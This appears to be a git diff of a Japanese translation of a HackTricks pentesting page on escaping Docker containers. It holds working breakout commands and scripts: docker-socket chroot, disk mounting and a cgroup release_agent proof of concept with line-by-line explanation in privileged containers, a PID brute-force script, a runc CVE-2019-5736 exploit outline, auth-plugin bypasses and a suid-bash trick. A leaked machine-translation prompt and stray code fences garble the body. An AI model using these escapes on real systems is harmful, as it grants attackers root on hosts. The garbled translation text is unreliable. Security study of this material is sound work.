@@ -1,38 +1,36 @@
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricksをサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
 
-# コンテナとは
+# コンテナとは何か
 
-要約すると、それは**cgroups**（プロセスが使用できるもの、例えばCPUやRAM）と**namespaces**（プロセスが見ることができるもの、例えばディレクトリや他のプロセス）を介して**分離されたプロセス**です。
+要約すると、**cgroups**（プロセスが使用できるもの、例えばCPUやRAM）と**namespaces**（プロセスが見ることができるもの、例えばディレクトリや他のプロセス）を介して**隔離された** **プロセス**です。
 ```bash
 docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
 ps -ef | grep 1234 #Get info about the sleep process
 ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
 ```
-# マウントされたDockerソケット
+# マウントされたdockerソケット
 
-もし何らかの方法で、DockerソケットがDockerコンテナ内にマウントされていることがわかった場合、それから脱出することができます。\
-これは通常、何らかの理由でDockerコンテナがDockerデーモンに接続してアクションを実行する必要がある場合に起こります。
+もし何らかの方法で**dockerソケットがマウントされている**ことがdockerコンテナ内で分かった場合、それを脱出することができます。\
+これは通常、何らかの理由でdockerデーモンに接続してアクションを実行する必要があるdockerコンテナで発生します。
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-この場合、通常のDockerコマンドを使用してDockerデーモンと通信することができます。
+この場合、通常のdockerコマンドを使用してdockerデーモンと通信できます：
 ```bash
 #List images to use one
 docker images
@@ -40,30 +38,30 @@ docker images
 docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
 ```
 {% hint style="info" %}
-予期しない場所に**dockerソケット**がある場合、パラメータ**`-H unix:///path/to/docker.sock`**を使用して**`docker`**コマンドでそれと通信することができます。
+**dockerソケットが予期しない場所にある場合**でも、パラメータ**`-H unix:///path/to/docker.sock`**を使用して**`docker`**コマンドで通信することができます。
 {% endhint %}
 
 # コンテナの機能
 
-コンテナの機能を確認する必要があります。以下のいずれかの機能がある場合、それを脱出することができるかもしれません：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE`**
+コンテナの機能を確認し、次のいずれかを持っている場合、脱出することができる可能性があります: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**
 
-現在のコンテナの機能を確認するには、次のコマンドを使用します：
+現在のコンテナの機能は以下のコマンドで確認できます:
 ```bash
 capsh --print
 ```
-以下のページでは、Linuxの機能について詳しく学び、それらを悪用する方法について学ぶことができます：
+以下のページでは、**Linuxの権限**についてさらに学び、それらをどのように悪用するかについて学ぶことができます：
 
 {% content-ref url="linux-capabilities.md" %}
 [linux-capabilities.md](linux-capabilities.md)
 {% endcontent-ref %}
 
-# `--privileged`フラグ
+# `--privileged` フラグ
 
---privilegedフラグを使用すると、コンテナはホストデバイスにアクセスできるようになります。
+`--privileged` フラグを使用すると、コンテナはホストデバイスへのアクセスを持つことができます。
 
-## ルート権限を取得する
+## Rootを所有する
 
-適切に設定されたDockerコンテナでは、**fdisk -l**のようなコマンドは許可されません。ただし、--privilegedフラグが指定されたミス構成のDockerコマンドでは、ホストドライブを表示するための特権を取得することが可能です。
+適切に設定されたDockerコンテナは、**fdisk -l** のようなコマンドを許可しません。しかし、`--privileged` フラグが指定されている誤設定されたDockerコマンドでは、ホストドライブを見る権限を取得することが可能です。
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -72,9 +70,11 @@ capsh --print
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-そして、できあがり！ホストのファイルシステムにアクセスできるようになりました。なぜなら、それが`/mnt/hola`フォルダにマウントされているからです。
+```markdown
+そして、ボワラ！ホストのファイルシステムにアクセスできるようになりました。それは`/mnt/hola`フォルダにマウントされています。
 
-{% code title="初期のPoC" %}
+{% code title="初期PoC" %}
+```
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -88,6 +88,8 @@ echo "#!/bin/sh $1 >$t/o" >/c;
 chmod +x /c;
 sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
+{% endcode %}
+
 {% code title="第二のPoC" %}
 ```bash
 # On the host
@@ -116,34 +118,34 @@ head /output
 ```
 {% endcode %}
 
-`--privileged`フラグは、重要なセキュリティ上の懸念を引き起こし、このエクスプロイトはそれを有効にした状態でDockerコンテナを起動することに依存しています。このフラグを使用すると、コンテナはすべてのデバイスに完全なアクセス権を持ち、seccomp、AppArmor、およびLinuxの機能制限がありません。
+`--privileged`フラグは重大なセキュリティ上の懸念を引き起こし、このエクスプロイトはそれが有効になっているDockerコンテナを起動することに依存しています。このフラグを使用すると、コンテナはすべてのデバイスへの完全なアクセス権を持ち、seccomp、AppArmor、Linuxの機能からの制限がありません。
 
-実際には、この方法でDockerコンテナから脱出するために必要な権限は、次のとおりです。
+実際、`--privileged`はこの方法でDockerコンテナから脱出するために必要な権限よりもはるかに多くの権限を提供します。現実には、「ただ」以下の要件があります：
 
-1. コンテナ内でrootとして実行している必要があります。
-2. コンテナは`SYS_ADMIN` Linux機能を持つように実行されている必要があります。
-3. コンテナにはAppArmorプロファイルがないか、または`mount`シスコールを許可するように設定されている必要があります。
-4. コンテナ内でcgroup v1仮想ファイルシステムが読み書き可能にマウントされている必要があります。
+1. コンテナ内でrootとして実行されている必要があります
+2. コンテナは`SYS_ADMIN` Linux機能で実行されている必要があります
+3. コンテナはAppArmorプロファイルを持っていないか、または`mount`システムコールを許可する必要があります
+4. コンテナ内でcgroup v1仮想ファイルシステムが読み書き可能でマウントされている必要があります
 
-`SYS_ADMIN`機能により、コンテナは`mount`シスコールを実行できます（[man 7 capabilities](https://linux.die.net/man/7/capabilities)を参照）。[Dockerはデフォルトで制限されたセットの機能でコンテナを起動します](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)が、セキュリティ上のリスクのために`SYS_ADMIN`機能を有効にしません。
+`SYS_ADMIN`機能はコンテナがマウントシステムコールを実行することを可能にします（[man 7 capabilities](https://linux.die.net/man/7/capabilities)を参照）。[Dockerはデフォルトで制限された機能セットでコンテナを起動します](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)し、セキュリティリスクのため`SYS_ADMIN`機能を有効にしません。
 
-さらに、Dockerはデフォルトで`docker-default` AppArmorポリシーでコンテナを起動しますが、[`mount`シスコールの使用を防止します](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)、たとえコンテナが`SYS_ADMIN`で実行されていてもです。
+さらに、Dockerはデフォルトで`docker-default` AppArmorポリシーでコンテナを[起動します](https://docs.docker.com/engine/security/apparmor/#understand-the-policies)。これは、`SYS_ADMIN`で実行されている場合でも、[マウントシステムコールの使用を防ぎます](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)。
 
-このテクニックに対して脆弱なコンテナは、次のフラグで実行された場合です：`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`
+コンテナは、フラグ`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`で実行された場合、このテクニックに対して脆弱になります。
 
-## Proof of Conceptの解説
+## コンセプト実証の分析
 
-このテクニックを使用するための要件を理解し、Proof of Conceptのエクスプロイトを洗練させたので、それを行ごとに説明していきましょう。
+このテクニックを使用するための要件を理解し、コンセプト実証エクスプロイトを洗練させたので、それを行ごとに歩いていき、どのように機能するかを示しましょう。
 
-このエクスプロイトをトリガーするためには、`release_agent`ファイルを作成し、cgroup内のすべてのプロセスを終了させることで`release_agent`が呼び出されるcgroupが必要です。最も簡単な方法は、cgroupコントローラをマウントし、子cgroupを作成することです。
+このエクスプロイトをトリガーするには、`release_agent`ファイルを作成し、cgroup内のすべてのプロセスを終了させることによって`release_agent`の呼び出しをトリガーできるcgroupが必要です。それを達成する最も簡単な方法は、cgroupコントローラをマウントし、子cgroupを作成することです。
 
-そのために、`/tmp/cgrp`ディレクトリを作成し、[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroupコントローラをマウントし、子cgroup（この例では「x」という名前）を作成します。すべてのcgroupコントローラがテストされているわけではありませんが、このテクニックはほとんどのcgroupコントローラで動作するはずです。
+それを行うために、`/tmp/cgrp`ディレクトリを作成し、[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroupコントローラをマウントし、子cgroup（この例では「x」と名付けられています）を作成します。すべてのcgroupコントローラがテストされたわけではありませんが、このテクニックは大多数のcgroupコントローラで機能するはずです。
 
-もしも「mount: /tmp/cgrp: special device cgroup does not exist」と表示された場合は、RDMA cgroupコントローラがセットアップされていないためです。それを修正するには、`rdma`を`memory`に変更してください。RDMAを使用しているのは、元のPoCがそれに対してのみ設計されていたためです。
+もし「mount: /tmp/cgrp: special device cgroup does not exist」というメッセージが出た場合、それはあなたのセットアップにRDMA cgroupコントローラがないためです。`rdma`を`memory`に変更することで修正できます。RDMAを使用しているのは、元のPoCがそれでのみ機能するように設計されていたからです。
 
-cgroupコントローラはグローバルなリソースであり、異なる権限で複数回マウントすることができ、1つのマウントで行われた変更は他のマウントにも適用されます。
+cgroupコントローラはグローバルリソースであり、異なる権限で複数回マウントすることができ、一つのマウントで行われた変更は別のマウントにも適用されることに注意してください。
 
-以下に、「x」の子cgroupの作成とそのディレクトリリストを示します。
+以下に「x」子cgroupの作成とそのディレクトリリストを示します。
 ```
 root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 root@b11cf9eab4fd:/# ls /tmp/cgrp/
@@ -151,27 +153,23 @@ cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  re
 root@b11cf9eab4fd:/# ls /tmp/cgrp/x
 cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
 ```
-次に、「x」cgroupのリリース時にcgroup通知を有効にするために、`notify_on_release`ファイルに1を書き込みます。また、RDMA cgroupのリリースエージェントを実行するために、ホスト上の`release_agent`ファイルにコンテナ内で後で作成する`/cmd`スクリプトのパスを書き込みます。これを行うために、コンテナのパスをホスト上の`/etc/mtab`ファイルから取得します。
+次に、「x」cgroupのリリース時にcgroup通知を有効にするために、その`notify_on_release`ファイルに1を書き込みます。また、コンテナ内で後で作成する`/cmd`スクリプトを実行するように、ホスト上の`release_agent`ファイルに`/cmd`スクリプトのパスを書き込むことで、RDMA cgroupリリースエージェントを設定します。これを行うために、`/etc/mtab`ファイルからホスト上のコンテナのパスを取得します。
 
-コンテナに追加または変更するファイルはホスト上に存在し、コンテナ内のパスとホスト上のパスの両方から変更することが可能です。
+コンテナ内で追加または変更するファイルはホスト上に存在し、コンテナ内のパスとホスト上のパスの両方から変更することが可能です。
 
-これらの操作は以下のように表示されます：
+以下にその操作を示します：
 ```
 root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
 root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-ホスト上に作成する予定の `/cmd` スクリプトのパスに注意してください。
+ホスト上で作成する `/cmd` スクリプトへのパスに注意してください：
 ```
 root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
 /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
 ```
-次に、`/cmd`スクリプトを作成します。このスクリプトは`ps aux`コマンドを実行し、その出力をコンテナ内の`/output`に保存します。ホスト上の出力ファイルのフルパスを指定します。最後に、`/cmd`スクリプトの内容を表示します。
-
-```bash
-#!/bin/sh
-ps aux > /output
-cat /cmd
+```markdown
+これで、`ps aux` コマンドを実行し、その出力をホスト上の出力ファイルの完全なパスを指定してコンテナの `/output` に保存するように `/cmd` スクリプトを作成します。最後に、`/cmd` スクリプトの内容を表示して確認します：
 ```
 ```
 root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
@@ -181,7 +179,7 @@ root@b11cf9eab4fd:/# cat /cmd
 #!/bin/sh
 ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
 ```
-最後に、攻撃を実行することができます。まず、即座に終了するプロセスを「x」の子cgroup内で生成します。`/bin/sh`プロセスを作成し、そのPIDを「x」の子cgroupディレクトリ内の`cgroup.procs`ファイルに書き込むことで、ホスト上のスクリプトが`/bin/sh`の終了後に実行されます。次に、ホスト上で実行された`ps aux`の出力をコンテナ内の`/output`ファイルに保存します。
+最終的に、"x" 子 cgroup 内で直ちに終了するプロセスを生成することで攻撃を実行できます。`/bin/sh` プロセスを作成し、その PID を "x" 子 cgroup ディレクトリの `cgroup.procs` ファイルに書き込むと、`/bin/sh` が終了した後にホスト上のスクリプトが実行されます。ホスト上で実行された `ps aux` の出力は、コンテナ内の `/output` ファイルに保存されます：
 ```
 root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 root@b11cf9eab4fd:/# head /output
@@ -198,31 +196,33 @@ root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
 ```
 # `--privileged` フラグ v2
 
-以前の PoC は、コンテナがマウントポイントのホストパス全体を公開するストレージドライバ（例：`overlayfs`）で構成されている場合には問題ありませんが、最近、ホストファイルシステムのマウントポイントが明示的に開示されていないいくつかの設定に遭遇しました。
+以前のPoCは、例えば `overlayfs` のように、マウントポイントのホストパス全体を露出するストレージドライバーでコンテナが設定されている場合にはうまく機能しますが、最近、ホストファイルシステムのマウントポイントを明らかにしていないいくつかの設定に遭遇しました。
 
 ## Kata Containers
 ```
 root@container:~$ head -1 /etc/mtab
 kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
 ```
-[Kata Containers](https://katacontainers.io)はデフォルトでコンテナのルートファイルシステムを`9pfs`上にマウントします。これにより、Kata Containers仮想マシン内のコンテナファイルシステムの場所に関する情報は漏洩しません。
+[Kata Containers](https://katacontainers.io)はデフォルトでコンテナのルートファイルシステムを`9pfs`を介してマウントします。これはKata Containersの仮想マシン内のコンテナファイルシステムの位置に関する情報を漏らしません。
 
-\* Kata Containersについては、将来のブログ記事で詳しく説明します。
+\* Kata Containersについては、将来のブログ投稿で詳しく説明します。
 
-## デバイスマッパー
+## Device Mapper
 ```
 root@container:~$ head -1 /etc/mtab
 /dev/sdc / ext4 rw,relatime,stripe=384 0 0
 ```
-## 代替 PoC
+ライブ環境でこのルートマウントを持つコンテナを見かけましたが、特定の `devicemapper` ストレージドライバー設定で実行されていたと思いますが、テスト環境でこの挙動を再現することはできませんでした。
 
-明らかに、これらの場合にはホストファイルシステム上のコンテナファイルのパスを特定するための十分な情報がありませんので、Felixの PoC はそのままでは使用できません。しかし、少しの工夫でこの攻撃を実行することはできます。
+## 代替のPoC
 
-必要な唯一の重要な情報は、コンテナ内で実行するための、コンテナホストに対する完全なパスです。コンテナ内のマウントポイントからこれを判別することができない場合は、他の場所を探す必要があります。
+明らかに、これらのケースではホストファイルシステム上のコンテナファイルのパスを特定するのに十分な情報がないため、FelixのPoCはそのままでは使用できません。しかし、少しの工夫でこの攻撃を実行することは可能です。
 
-### Proc が救済策 <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>
+必要な鍵となる情報は、コンテナ内で実行するファイルの完全なパスであり、コンテナホストに対して相対的なものです。コンテナ内のマウントポイントからこれを判別することができない場合、他の方法を探る必要があります。
 
-Linux の `/proc` 仮想ファイルシステムは、システム上で実行されているすべてのプロセス、例えばコンテナ内のプロセスを含む、異なる名前空間で実行されているプロセスのカーネルプロセスデータ構造を公開します。これは、コンテナ内のプロセスの `/proc` ディレクトリにアクセスすることで、ホスト上のプロセスのコマンドを実行することで示すことができます。
+### Procが救世主に <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>
+
+Linuxの `/proc` 疑似ファイルシステムは、システム上で実行されているすべてのプロセスのカーネルプロセスデータ構造を公開しており、例えばコンテナ内の異なる名前空間で実行されているプロセスも含まれます。これは、コンテナ内でコマンドを実行し、ホスト上のプロセスの `/proc` ディレクトリにアクセスすることで示されます：コンテナ
 ```bash
 root@container:~$ sleep 100
 ```
@@ -246,15 +246,17 @@ lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
 -rw-r--r--   1 root root 0 Nov 19 10:29 sched
 ...
 ```
-_ちなみに、`/proc/<pid>/root`データ構造は、私が非常に長い間混乱していたものでした。なぜ`/`へのシンボリックリンクが有用なのか理解できませんでしたが、manページの実際の定義を読んでから理解できました。_
+以下は、ハッキング技術に関するハッキングの本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。
+
+_余談ですが、`/proc/<pid>/root` データ構造は、私が非常に長い間混乱していたもので、なぜ `/` へのシンボリックリンクが有用なのか理解できませんでした。それは、manページで実際の定義を読むまでのことでした。_
 
 > /proc/\[pid]/root
 >
-> UNIXとLinuxは、chroot(2)システムコールによって設定されるプロセスごとのファイルシステムのルートをサポートしています。このファイルは、プロセスのルートディレクトリを指すシンボリックリンクであり、exeやfd/\*と同じように動作します。
+> UNIXおよびLinuxは、chroot(2)システムコールによって設定されるプロセスごとのファイルシステムのルートという考えをサポートしています。このファイルは、プロセスのルートディレクトリを指すシンボリックリンクであり、exeやfd/\*と同じように動作します。
 >
-> ただし、このファイルは単なるシンボリックリンクではありません。プロセス自体と同じファイルシステムのビュー（名前空間とプロセスごとのマウントのセットを含む）を提供します。
+> ただし、このファイルは単なるシンボリックリンクではありません。プロセス自体と同じファイルシステムのビュー（名前空間やプロセスごとのマウントセットを含む）を提供します。
 
-`/proc/<pid>/root`シンボリックリンクは、コンテナ内の任意のファイルへのホスト相対パスとして使用できます：Container
+`/proc/<pid>/root` シンボリックリンクは、コンテナ内の任意のファイルへのホスト相対パスとして使用できます：Container
 ```bash
 root@container:~$ echo findme > /findme
 root@container:~$ sleep 100
@@ -264,11 +266,11 @@ root@container:~$ sleep 100
 root@host:~$ cat /proc/`pidof sleep`/root/findme
 findme
 ```
-攻撃の要件が、コンテナ内のファイルのフルパスをコンテナホストに対して知る必要から、コンテナ内で実行されている_任意の_プロセスのpidを知る必要に変わります。
+この攻撃の要件は、コンテナ内のファイルの完全なパスをコンテナホストに対して知っていることから、コンテナ内で実行されている_任意の_プロセスのpidを知っていることに変わります。
 
 ### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>
 
-これは実際には簡単な部分です。Linuxでは、プロセスIDは数値であり、順番に割り当てられます。`init`プロセスはプロセスID `1`が割り当てられ、その後のプロセスは増分のIDが割り当てられます。コンテナ内のプロセスのホストプロセスIDを特定するために、ブルートフォースの増分検索が使用されます。
+これは実際には簡単な部分です。LinuxではプロセスIDは数値であり、順番に割り当てられます。`init`プロセスにはプロセスID `1`が割り当てられ、その後のすべてのプロセスにはインクリメンタルなIDが割り当てられます。コンテナ内のプロセスのホストプロセスIDを特定するために、ブルートフォースのインクリメンタル検索が使用できます：Container
 ```
 root@container:~$ echo findme > /findme
 root@container:~$ sleep 100
@@ -282,13 +284,13 @@ root@host:~$ echo ${COUNTER}
 root@host:~$ cat /proc/${COUNTER}/root/findme
 findme
 ```
-### すべてを組み合わせる <a href="putting-it-all-together" id="putting-it-all-together"></a>
+### すべてをまとめる <a href="putting-it-all-together" id="putting-it-all-together"></a>
 
-この攻撃を完了するために、ブルートフォース技術を使用してパス `/proc/<pid>/root/payload.sh` の pid を推測することができます。各反復で推測された pid パスを cgroups の `release_agent` ファイルに書き込み、`release_agent` をトリガーし、出力ファイルが作成されるかどうかを確認します。
+この攻撃を完了するために、ブルートフォース技術を使用して `/proc/<pid>/root/payload.sh` のパスの pid を推測し、各イテレーションで推測された pid パスを cgroups の `release_agent` ファイルに書き込み、`release_agent` をトリガーし、出力ファイルが作成されるかどうかを確認します。
 
-この技術の唯一の注意点は、これが決して微妙な方法ではなく、pid の数を非常に高くする可能性があることです。長時間実行されるプロセスは実行されないため、信頼性の問題は発生しないはずですが、私の言葉を引用しないでください。
+この技術の唯一の注意点は、それが微妙ではなく、pid の数を非常に高くする可能性があるということです。長時間実行されるプロセスは実行されないため、これは信頼性の問題を引き起こすべきではありませんが、その点については私の言葉を引用しないでください。
 
-以下の PoC は、cgroups の `release_agent` 機能を使用して特権コンテナからの脱出を実現するために、Felix の元の PoC で最初に提示されたものよりも一般的な攻撃を提供するためにこれらの技術を実装しています:
+以下の PoC は、これらの技術を実装して、Felix の元の PoC で最初に提示されたものよりも一般的な攻撃を提供します。これは、cgroups の `release_agent` 機能を使用して特権コンテナから脱出するためのものです：
 ```bash
 #!/bin/sh
 
@@ -348,7 +350,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-特権コンテナ内でPoCを実行すると、次のような出力が得られるはずです。
+プリビレッジドコンテナ内でPoCを実行すると、以下のような出力が得られるはずです：
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -378,40 +380,40 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ```
 # Runc exploit (CVE-2019-5736)
 
-`docker exec`をrootとして実行できる場合（おそらくsudoを使用している場合）、CVE-2019-5736を悪用してコンテナからホストの特権を昇格させることができます（[ここ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)にエクスプロイトがあります）。このテクニックは基本的には**ホストの**_**/bin/sh**_バイナリを**コンテナから上書き**するものであり、docker execを実行するとペイロードがトリガーされます。
+root権限で`docker exec`を実行できる場合（おそらくsudoを使用）、CVE-2019-5736を悪用してコンテナから脱出し権限を昇格させることができます（exploitは[こちら](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）。この技術は基本的に**ホスト**の_**/bin/sh**_ バイナリを**コンテナから** **上書き**するので、docker execを実行する人は誰でもペイロードをトリガーする可能性があります。
 
-ペイロードを適宜変更し、`go build main.go`でmain.goをビルドします。ビルドされたバイナリは、実行のためにdockerコンテナに配置する必要があります。\
-実行時に`[+] Overwritten /bin/sh successfully`と表示されると、ホストマシンから次のコマンドを実行する必要があります：
+ペイロードを適切に変更し、`go build main.go`でmain.goをビルドします。結果として得られるバイナリは、実行のためにdockerコンテナに配置する必要があります。\
+実行時に`[+] Overwritten /bin/sh successfully`と表示されたら、ホストマシンから以下を実行する必要があります：
 
 `docker exec -it <container-name> /bin/sh`
 
 これにより、main.goファイルに存在するペイロードがトリガーされます。
 
-詳細についてはこちらを参照してください：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
+詳細については：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
 # Docker Auth Plugin Bypass
 
-一部の場合、システム管理者は特権の昇格を防ぐために、低特権ユーザーが特権を持たない状態でdockerとやり取りするためのプラグインをインストールすることがあります。
+場合によっては、sysadminはdockerにいくつかのプラグインをインストールして、低権限ユーザーが権限を昇格させることなくdockerと対話するのを防ぐかもしれません。
 
-## `run --privileged`の禁止
+## disallowed `run --privileged`
 
-この場合、システム管理者はユーザーが`--privileged`フラグを使用してボリュームをマウントしたり、コンテナに任意の追加機能を与えたりすることを禁止しています。
+このケースでは、sysadminは**ユーザーがボリュームをマウントしたり、`--privileged`フラグを使用してコンテナを実行したり、コンテナに追加の機能を与えることを** **禁止しました**：
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-ただし、ユーザーは**実行中のコンテナ内にシェルを作成し、追加の特権を与えることができます**：
+しかし、ユーザーは**実行中のコンテナ内にシェルを作成し、それに追加の権限を与えることができます**：
 ```bash
 docker run -d --security-opt "seccomp=unconfined" ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
 docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
 ```
-今、ユーザーは以前に説明したいずれかのテクニックを使用してコンテナから脱出し、ホスト内で特権を昇格させることができます。
+ユーザーは、以前に議論された技術のいずれかを使用してコンテナから脱出し、ホスト内で権限を昇格させることができます。
 
 ## 書き込み可能なフォルダのマウント
 
-この場合、システム管理者はユーザーに`--privileged`フラグでコンテナを実行することを許可せず、コンテナに追加の機能を与えることも許可しませんでした。ただし、`/tmp`フォルダのマウントのみを許可しました。
+このケースでは、sysadminはユーザーがコンテナに `--privileged` フラグを使用することや、コンテナに追加の機能を与えることを**禁止し**、`/tmp` フォルダのマウントのみを許可しました：
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -421,17 +423,17 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 {% hint style="info" %}
-注意してください、おそらく`/tmp`フォルダをマウントすることはできませんが、**別の書き込み可能なフォルダ**をマウントすることはできます。書き込み可能なディレクトリを見つけるには、次のコマンドを使用します：`find / -writable -type d 2>/dev/null`
+/tmpフォルダをマウントできない場合がありますが、**異なる書き込み可能なフォルダ**をマウントすることができます。書き込み可能なディレクトリを見つけるには、次のコマンドを使用します：`find / -writable -type d 2>/dev/null`
 
-**すべてのディレクトリがsuidビットをサポートしているわけではありません！** suidビットをサポートしているディレクトリを確認するには、`mount | grep -v "nosuid"`を実行します。たとえば、通常、`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、`/var/lib/lxcfs`はsuidビットをサポートしていません。
+**Linuxマシンのすべてのディレクトリがsuidビットをサポートしているわけではありません！** suidビットをサポートしているディレクトリを確認するには、`mount | grep -v "nosuid"` を実行します。例えば通常、`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、`/var/lib/lxcfs` はsuidビットをサポートしていません。
 
-また、dockerコンテナからrootとしてホストで悪用するために、**`/etc`や設定ファイルを含む他のフォルダ**をマウントできる場合は、それらを変更することもできます（たとえば、`/etc/shadow`を変更することができます）。
+また、**`/etc`やその他の設定ファイルを含むフォルダをマウントできる**場合、dockerコンテナ内でrootとしてそれらを変更し、**ホストで悪用して権限を昇格させる**ことができます（例えば`/etc/shadow`を変更することによって）。
 {% endhint %}
 
 ## チェックされていないJSON構造
 
